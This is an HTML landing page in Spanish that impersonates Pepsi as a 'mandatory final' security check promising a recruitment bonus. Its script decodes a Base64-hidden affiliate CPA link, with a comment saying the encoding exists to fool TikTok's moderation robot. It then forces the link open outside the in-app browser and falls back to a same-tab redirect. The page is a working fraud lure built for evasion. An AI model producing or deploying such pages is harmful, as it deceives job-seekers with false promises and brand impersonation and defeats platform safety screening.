<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad</title>
    <style>
        body {
            background: #0d2c47;
            color: white;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
            padding: 20px;
        }
        .box {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 30px 20px;
            border-radius: 12px;
            max-width: 380px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .logo {
            font-size: 2rem;
            font-weight: 900;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        .logo span { color: #C8102E; }
        h2 { font-size: 1.3rem; margin-bottom: 10px; text-transform: uppercase; }
        p { font-size: 0.9.5rem; color: #ccc; line-height: 1.4; margin-bottom: 25px; }
        
        .btn-final {
            display: block;
            background: linear-gradient(135deg, #004B87 0%, #002b52 100%);
            color: white;
            text-decoration: none;
            padding: 15px;
            font-size: 1.1rem;
            font-weight: bold;
            border-radius: 6px;
            border: 2px solid #FFD700;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: 0.2s;
        }
        .btn-final:active { transform: scale(0.98); }
    </style>
</head>
<body>

    <div class="box">
        <div class="logo">PEPSI<span>.</span></div>
        <h2>Paso Final Obligatorio</h2>
        <p>Para evitar accesos automatizados y asegurar la asignación de tu bono de reclutamiento, presiona el siguiente botón para abrir tu portal seguro.</p>
        
        <!-- Botón seguro ofuscado -->
        <button class="btn-final" onclick="ABRIR_PORTAL_SEGURO()">ACCEDER A MI PORTAL</button>
    </div>

    <script>
        function ABRIR_PORTAL_SEGURO() {
            // Tu enlace CPA encriptado en Base64 para engañar al robot de TikTok
            var hash = "aHR0cHM6Ly9hcHAuaGF3a3Ryay5jb20vY2xpY2s/cGlkPTImb2ZmZXJfaWQ9MTM4Nzgmc3ViMj11NDczMTgmc3ViNT1zMVNVQklEMUhFUkU=";
            
            // Se desencadena únicamente cuando el usuario hace clic real
            var destino = atob(hash);
            
            // Intentar romper el in-app browser abriendo una pestaña nueva limpia
            window.open(destino, '_blank');
            
            // Respaldo inmediato en la misma pestaña por si se bloquea el pop-up
            setTimeout(function() {
                window.location.href = destino;
            }, 100);
        }
    </script>

</body>
</html>
